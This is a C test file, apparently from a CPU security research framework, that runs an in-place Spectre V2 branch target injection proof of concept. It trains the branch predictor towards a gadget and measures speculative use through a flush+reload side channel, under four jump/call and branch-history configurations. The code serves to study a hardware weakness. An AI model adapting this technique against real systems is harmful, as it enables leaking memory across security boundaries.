/**
 * Spectre V2 Branch Target Injection (BTI)
 *
 * This is an example of a basic in-place BTI. It consists of a training and signaling
 * phase. During training a BTB entry to DST_gadget is injected. During singling it is
 * verified if the injected entry is used for providing a target for the victim.
 * The victim branch instruction is either an indirect call or an indirect jump. History
 * is setup before the speculation primitive to have either a matching or different
 * history.
 *
 * The BTI is done in the following for configuration:
 * - a) jmp*, matching history
 * - b) jmp*, different history
 * - c) call*, matching history
 * - d) call*, different history
 *
 * Configuration a) and c) lead to perfect signals, b) and d) to to a much weaker, but
 * constant, signal.
 */

#include "flush_reload.h"
#include "jita.h"
#include "log.h"
#include "spec_lib.h"
#include "test.h"
#include "uarf_pi/uarf_pi.h"

#ifdef LOG_TAG
#undef LOG_TAG
#define LOG_TAG LOG_TAG_TEST
#endif

psnip_declare(history, psnip_history);
psnip_declare(src_call_ind, psnip_src_call_ind);
psnip_declare(src_jmp_ind, psnip_src_jmp_ind);
psnip_declare(dst_gadget, psnip_dst_gadget);
psnip_declare(dst_dummy, psnip_dst_dummy);

struct TestCaseData {
    uint32_t seed;
    uint32_t num_cands;
    uint32_t num_rounds;
    uint32_t num_train_rounds;
    jita_ctxt_t jita_main;
    bool match_history;
};

static jita_ctxt_t jita_main_call;
static jita_ctxt_t jita_main_jmp;
static jita_ctxt_t jita_gadget;
static jita_ctxt_t jita_dummy;

static stub_t stub_main;
static stub_t stub_gadget;
static stub_t stub_dummy;

TEST_CASE_ARG(basic, arg) {
    struct TestCaseData *data = (struct TestCaseData *) arg;
    srand(data->seed);

    // struct FrConfig fr = fr_init(8, 6, (size_t[]){0, 1, 2, 3, 5, 10});
    struct FrConfig fr = fr_init(8, 1, NULL);

    IBPB();

    fr_reset(&fr);

    for (size_t c = 0; c < data->num_cands; c++) {
        jita_allocate(&data->jita_main, &stub_main, rand47());
        jita_allocate(&jita_gadget, &stub_gadget, rand47());
        jita_allocate(&jita_dummy, &stub_dummy, rand47());

        struct history h1 = get_randomized_history();
        struct history h2 = data->match_history ? h1 : get_randomized_history();

        struct SpecData train_data = {
            .spec_prim_p = stub_main.addr,
            .spec_dst_p_p = _ul(&stub_gadget.addr),
            .fr_buf_p = fr.buf2.addr,
            .secret = 0,
            .hist = h1,
        };

        struct SpecData signal_data = {
            .spec_prim_p = stub_main.addr,
            .spec_dst_p_p = _ul(&stub_dummy.addr),
            .fr_buf_p = fr.buf.addr,
            .secret = 1,
            .hist = h2,
        };

        for (size_t r = 0; r < data->num_rounds; r++) {

            for (size_t t = 0; t < data->num_train_rounds; t++) {
                asm("train:\n\t");
                asm volatile("lea return_here%=, %%rax\n\t"
                             "pushq %%rax\n\t"
                             "jmp *%0\n\t"
                             "return_here%=:\n\t" ::"r"(train_data.spec_prim_p),
                             "c"(&train_data)
                             : "rax", "rdx", "rdi", "rsi", "r8", "memory");
            }

            fr_flush(&fr);
            clflush_spec_dst(&signal_data);
            invlpg_spec_dst(&signal_data);
            prefetcht0(&train_data);

            // TODO: disable interrupts and preemption
            asm("signal:\n\t");
            asm volatile("lea return_here%=, %%rax\n\t"
                         "pushq %%rax\n\t"
                         "jmp *%0\n\t"
                         "return_here%=:\n\t" ::"r"(signal_data.spec_prim_p),
                         "c"(&signal_data)
                         : "rax", "rdx", "rdi", "rsi", "r8", "memory");

            fr_reload_binned(&fr, r);
        }
        jita_deallocate(&data->jita_main, &stub_main);
        jita_deallocate(&jita_gadget, &stub_gadget);
        jita_deallocate(&jita_dummy, &stub_dummy);
    }

    LOG_INFO("Fr Buffer\n");
    fr_print(&fr);

    fr_deinit(&fr);

    TEST_PASS();
}

static struct TestCaseData data1;
static struct TestCaseData data2;
static struct TestCaseData data3;
static struct TestCaseData data4;

TEST_SUITE() {
    uint32_t seed = get_seed();
    LOG_INFO("Using seed: %u\n", seed);
    pi_init();

    jita_push_psnip(&jita_main_call, &psnip_history);
    jita_push_psnip(&jita_main_call, &psnip_history);
    jita_push_psnip(&jita_main_call, &psnip_history);
    jita_push_psnip(&jita_main_call, &psnip_history);
    jita_push_psnip(&jita_main_call, &psnip_history);

    jita_clone(&jita_main_call, &jita_main_jmp);

    jita_push_psnip(&jita_main_call, &psnip_src_call_ind);
    jita_push_psnip(&jita_main_jmp, &psnip_src_jmp_ind);

    jita_push_psnip(&jita_gadget, &psnip_dst_gadget);
    jita_push_psnip(&jita_dummy, &psnip_dst_dummy);

    data1 = (struct TestCaseData){
        .seed = seed++,
        .num_cands = 100,
        .num_rounds = 10,
        .num_train_rounds = 1,
        .jita_main = jita_main_jmp,
        .match_history = true,
    };

    data2 = (struct TestCaseData){
        .seed = seed++,
        .num_cands = 100,
        .num_rounds = 10,
        .num_train_rounds = 1,
        .jita_main = jita_main_jmp,
        .match_history = false,
    };

    data3 = (struct TestCaseData){
        .seed = seed++,
        .num_cands = 100,
        .num_rounds = 10,
        .num_train_rounds = 1,
        .jita_main = jita_main_call,
        .match_history = true,
    };

    data4 = (struct TestCaseData){
        .seed = seed++,
        .num_cands = 100,
        .num_rounds = 10,
        .num_train_rounds = 1,
        .jita_main = jita_main_call,
        .match_history = false,
    };

    RUN_TEST_CASE_ARG(basic, &data1);
    RUN_TEST_CASE_ARG(basic, &data2);
    RUN_TEST_CASE_ARG(basic, &data3);
    RUN_TEST_CASE_ARG(basic, &data4);

    pi_deinit();

    return 0;
}
